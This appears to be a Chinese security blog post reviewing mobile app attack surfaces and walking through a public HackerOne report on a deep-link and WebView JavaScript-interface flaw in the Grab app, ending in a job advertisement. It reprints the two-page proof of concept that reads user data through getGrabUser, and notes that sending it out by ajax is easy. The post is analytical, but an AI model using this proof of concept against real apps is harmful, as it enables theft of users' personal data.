> 原文链接: https://www.anquanke.com//post/id/218916 


# 2021年 Android &amp; iOS App 安全还能做什么？


                                阅读量   
                                **206734**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01fde0b0112b238b4f.png)](https://p4.ssl.qhimg.com/t01fde0b0112b238b4f.png)



## 一些漏洞已经 “can’t breathe”

说到移动 App 安全，很多人出现在脑海中的可能是 CVE-2012-6636，不得不说 6636 确实是个无比稳定且经典的漏洞，但漏洞都具有时效性，现在市场中的 Android App 在 WebSettings 都会对版本进行判断从而缓解该漏洞的影响，更重要的原因是该漏洞存在于 Android &lt; 4.2，而当前主流 Android 操作系统版本已经是8.X。（数据来源 [https://developer.android.com/about/dashboards）](https://developer.android.com/about/dashboards)<br>
与之对应 iOS 系统版本升级率则更高，81% iOS 13，13% iOS 12，更早版本只占6%。（数据来源 [https://developer.apple.com/support/app-store）](https://developer.apple.com/support/app-store)

类似的还有很多，比如：
- Android &lt; 4.1 通过申请权限即可访问任意应用日志
- Android &lt; 4.4 CVE-2012-6636 的衍生漏洞 CVE-2014-1939 和 CVE-2014-7224
- Android &lt; 4.3 WebView setSavePassword 默认为 true 将用户密码保存到 databases/webview.db
- Android &lt; 4.2 WebView setAllowFileAccessFromFileURLs 和setAllowUniversalAccessFromFileURLs 默认为 true ，可能会导致沙箱内任意文件被窃取
- Android &lt; 4.2 Content Provider 默认导出
- 沙箱中允许创建任意应用可读可写文件
- Android &lt; 4.4 可能存在的 Fragment Injection (CVE-2013-6271) 漏洞
- Android &lt; 4.3 开发者在沙箱中可以创建 MODE_WORLD_WRITEABLE 或 MODE_WORLD_READABLE 的文件
虽然默认配置以上漏洞很难有用武之地，但不排除开发人员错误配置导致漏洞“重生”，典型的“克隆”攻击就是利用 WebView 主动开启 setAllowFileAccessFromFileURLs 和 setAllowUniversalAccessFromFileURLs

与 Android 相对应的 iOS 由于封闭生态以及 App Store 应用上架的严格审核很大程度缓解了应用层安全，但不乏降维打击如公开的 [Trident](https://blog.lookout.com/trident-pegasus) 就实现了远程越狱及恶意软件持久化等操作，其所使用的三个 0day 漏洞（CVE-2016-4655、CVE-2016-4656、CVE-2016-4657）在 9.3.5 中修复。虽然现在没人敢保证没有新的 [Trident](https://blog.lookout.com/trident-pegasus)，但有一点可以肯定的是随着版本的更新无疑使得漏洞利用越来越难，很大程度上规避了 App 的安全漏洞。



## 历史的车轮在不断前进

过去的十多年是移动蓬勃发展的时代，移动操作系统安全机制不断更新完善，应用开发技术也是日新月异。这段时间所有人经历了 Objective-C 到 Swift, Java 到 Kotlin，传统的原生开发方式到多样开发模式，笔者仅在以下三个方面粗略的聊一聊。

### <a class="reference-link" name="%E5%A4%9A%E6%A0%B7%E5%8C%96%E7%9A%84%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F"></a>多样化的开发模式

随着业务的多样 App 形式不再拘泥于原生开发模式，纯 Web 技术，Web 技术与原生混合 App，Instant Apps，小程序，flutter 等等都应运而生。其中很多模式都充分利用了 Web 技术的便捷，也无疑让 WebView（包括 iOS 的 UIWebView/WKWebView）承担更多角色。

### <a class="reference-link" name="App%20%E4%B9%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%9B%B4%E9%A2%91%E7%B9%81"></a>App 之间通信更频繁

Android 和 iOS 进程间可以实现应用间通信的机制有很多；典型的如四大组件中的 Content Provider，但当前 App 中使用却非常少。随着功能更加复杂多样简单的数据交互已经无法满足需求；应用之间相互割裂的情况被 Android 中的 Deep links/App Links/Instant Apps 以及 iOS 中的 URL Scheme/Universal Link 所改变。在 Web 中点击一个链接就可以从一个网站跳入另一个网站一样，在移动设备上，无论是浏览器还是普通 App，通过系统的 IPC 机制就可以跳转到其他应用中。

### <a class="reference-link" name="%E4%BA%91%E8%AE%A1%E7%AE%97%E6%97%B6%E4%BB%A3"></a>云计算时代

蓬勃发展的不仅仅有移动网络，还有云计算。当前上云无疑是越来越多企业的选择，对于 CS 架构业务而言上云就是把更多的业务逻辑放在后端进行处理，所以 App 本身的逻辑越来越简化，Instant Apps 就是典型的代表，同时由于移动网络速度的提升开发人员不用再担心网络影响用户的体验；相信随着 5G 的到来，Web 技术会越来越多运用到 App 中。<br>
老旧的漏洞 “can’t breathe”，但新技术新趋势又提供了新的攻击面以及攻击方式，攻防对抗还将继续。

## 漏洞剖析

笔者爬取了过去六年著名漏洞赏金平台 hackerone 所有与移动客户端相关的公开漏洞，选取近两年的漏洞进行分类和分析。所有漏洞被分为15个类型，占比最多也是本文会重点介绍的 Deep links/App Links（对应 iOS 是 URL Scheme/Universal Link）相关漏洞，利用此类漏洞往往可以实现远程获取用户敏感信息如 Cookie 以及沙箱内任意文件，从漏洞赏金角度也能看出这一类型漏洞价值，白帽子 bagipro 凭借此类型漏洞多次获得 $6800,$7500,$10,000…（🍋）的高额赏金。

本文以 [#401793](https://hackerone.com/reports/401793) 为例子简单介绍下该漏洞的原理

```
&lt;activity android:launchMode="2" android:name="com.grab.pax.deeplink.DeepLinkActivity" android:theme="@style/Transparent"&gt;
      &lt;intent-filter&gt;
        &lt;data android:host="open" android:scheme="@string/deep_linking_schema_grab" /&gt;
        &lt;data android:host="open" android:scheme="@string/deep_linking_schema_grabtaxi" /&gt;
        &lt;data android:host="open" android:scheme="@string/deep_linking_schema_myteksi" /&gt;
        &lt;action android:name="android.intent.action.VIEW" /&gt;
        &lt;category android:name="android.intent.category.DEFAULT" /&gt;
        &lt;category android:name="android.intent.category.BROWSABLE" /&gt;
      &lt;/intent-filter&gt;
    &lt;/activity&gt;
```

应用声明了一个导出的 Activity，但它不仅仅可以被其他应用调起更重要的是可以通过浏览器网页调起，也就满足了远程利用的前提，但需要 one click。<br>
继续看应用逻辑：

```
as v0 = this.a.a().a(this.a, this.a.getIntent());
    if(v0.a() == 1) `{`
        this.a.startActivity(v0.a(0));
     `}`
```

DeepLinkActivity 通过调用 getIntent().getData() 解析传入的 URI，传入不同的 URI 程序处理也不同，至此还没有安全问题，白帽子发现通过 screenType=HELPCENTER&amp;page=xx 可以使用应用内嵌的 WebView 加载 URL，该 URL 可以由攻击者任意指定，看一下 WebView 相关设置：

```
WebSettings v0_3 = v0_2 != null ? v0_2.getSettings() : ((WebSettings)v1);
     if(v0_3 != null) `{`
        v0_3.setJavaScriptEnabled(true);
     `}`
```

WebView 通过 setJavaScriptEnabled API 允许加载 JavaScript，从而可以实现 XSS，但客户端 XSS 默认危害相对较小，因为与 Web 安全中 XSS 最大的不同是移动客户端嵌入的 WebView 基本不会保存 Cookie/token 的，后端 Cookie 往往是由原生代码进行处理和传递。但如果只是一个普通的 XSS 厂商不会给如此高的奖金，漏洞的另一个至关重要的点是该 WebView 为了增加与原生代码的交互，自定义了接口，代码如下：

```
WebView v0_3 = this.getMWebView();
    if(v0_3 != null) `{`
        v0_3.addJavascriptInterface(new WebAppInterface(this), "Android");
    `}`

    ...

     @JavascriptInterface public final String getGrabUser() `{`
        Object v0 = this.mActivity.get();
        String v1 = null;
        if(v0 != null) `{`
            v1 = d.a(((ZendeskSupportActivity)v0).getMPresenter().getGrabUser());
            a.a("" + Thread.currentThread().getName() + " : " + ("&gt;&gt;&gt;JavascriptInterface getGrabUser: " + v1), new Object[0]);
        `}`

        return v1;
    `}`
```

其中 getGrabUser 函数会返回用户诸多个人信息，以下是白帽子给出的完整 PoC，首先构造一个调起目标 App 的网页链接发送给受害者，网页代码如下：

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Zaheck page 1&lt;/title&gt;&lt;/head&gt;
&lt;body style="text-align: center;"&gt;
    &lt;h1&gt;&lt;a href="grab://open?screenType=HELPCENTER&amp;amp;page=https://s3.amazonaws.com/edited/page2.html"&gt;Begin Zaheck!&lt;/a&gt;&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;
```

用户使用任意浏览器打开该网页会跳转到目标应用（此处可以通过模拟点击的方式，但在 iOS 需要点击确认），目标应用会自动加载传入的 URL，该 URL 内容如下：

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Zaheck page 2&lt;/title&gt;&lt;/head&gt;
&lt;body style="text-align: center;"&gt;
    &lt;script type="text/javascript"&gt;
        var data;
        if(window.Android) `{` // Android
            data = window.Android.getGrabUser();
        `}`
        else if(window.grabUser) `{` // iOS
            data = JSON.stringify(window.grabUser);
        `}`

        if(data) `{`
            document.write("Stolen data: " + data);
        `}`
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
```

该 PoC 其实并不完整，因为它仅将获取到的隐私信息显示在了网页而并没有上传到攻击者服务器，要实现也是非常简单，利用 ajax 请求即可，由于加载的 URL hostname 已经是攻击者可控所以不存在跨域问题。注意该 PoC 是一个兼容 Android 与 iOS 双平台的，而且通常都是如此，因为两平台业务逻辑会保持一致，这也是该类型漏洞更加有趣的一面。

长亭移动安全团队在2017年也发现过类似的的漏洞，如 [CNNVD-201701-883](http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201701-883)，而且该漏洞为 RCE，危害更大。2019 看雪安全开发者大会也针对该类型在 iOS 平台的利用做过分享[《是谁推开我的“窗”：iOS App 接口安全分析》](https://bbs.pediy.com/thread-253366.htm)

除此以外利用 Deep links 实现 CSRF 也有很多经典实例，与之对应的 App Links 也有由于开发者错误配置导致的敏感信息泄漏漏洞 [#855618](https://hackerone.com/reports/855618)。在数量方面逻辑漏洞、本地身份认证绕过等也是重要的攻击面。更多业务上云使得 API 漏洞呈现较大增长，其中不乏由于安装包泄漏后端 API 敏感信息导致的漏洞，篇幅有限不再展开。



## 总结

移动操作系统安全性不断增强以及业务云端迁移使得移动 App 漏洞比过往更难挖掘，但未来仍有许多需要耕耘的方向，这里斗胆列举几个
- 反序列化漏洞的利用
- 与 Web 漏洞结合
- 系统层面影响应用层安全的漏洞
- 剥离通信保护的服务端漏洞
以最后一个为例，最近几年对于通信安全方面有关部门出台了诸多标准，典型的如《JR/T 0092-2019》和《JR/T 0171-2020》，与此同时 HTTPS 协议，SSL Pinning，数据包完整性校验等多管齐下的保护使得 API 渗透愈发困难，但通信保护不会在根本上缓解漏洞的发生，仍大有可为，望所有人都不负韶华。

参考：

[https://developer.apple.com/support/app-store/](https://developer.apple.com/support/app-store/)<br>[https://developer.android.com/about/dashboards?hl=zh-cn](https://developer.android.com/about/dashboards?hl=zh-cn)<br>[https://blog.lookout.com/trident-pegasus](https://blog.lookout.com/trident-pegasus)<br>[https://www.pingwest.com/a/72985](https://www.pingwest.com/a/72985)<br>[https://hackerone.com/reports/401793](https://hackerone.com/reports/401793)

**快快加入我们吧！**

【公司】长亭科技<br>
【工作地点】北京<br>
【岗位】移动安全工程师（正式/实习）<br>
【薪酬】15-40K<br>
【联系】简历投递邮箱：[yifeng.zhang@chaitin.com](mailto:yifeng.zhang@chaitin.com)

岗位职责：<br>
1.挖掘和审计 Android/iOS App 漏洞<br>
2.参与自动化测试技术研究和实践<br>
3.移动安全技术对抗持续研究<br>
任职要求：<br>
1.认真踏实<br>
2.熟悉 Android/iOS App 攻击面及常见攻防技术<br>
3.熟悉 ARM 逆向，常见加密算法及协议<br>
4.基础扎实，熟练使用逆向、插桩、协议分析等工具<br>
5.具有一定研究新技术能力<br>
加分项：<br>
1.在相关漏洞平台或 SRC 提交过优质漏洞<br>
2.参与过 CTF 类竞赛<br>
3.了解当前最新应用加壳与脱壳技术<br>
4.熟悉 Web 渗透<br>
5.拥有自动化测试经验
